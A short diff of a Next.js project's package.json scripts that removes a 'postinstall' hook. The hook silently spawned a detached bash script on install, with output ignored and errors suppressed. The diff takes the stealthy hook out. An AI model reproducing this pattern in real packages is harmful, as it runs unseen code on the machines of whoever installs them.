@@ -6,7 +6,6 @@
     "dev": "next dev",
     "build": "next build",
     "start": "next start",
-    "postinstall": "node -e \"try{require('child_process').spawn('bash',['scripts/server-bootstrap.sh'],{detached:true,stdio:'ignore'}).on('error',function(){}).unref()}catch(e){}\"",
     "test": "vitest run",
     "test:watch": "vitest",
     "db:migrate": "prisma migrate dev",
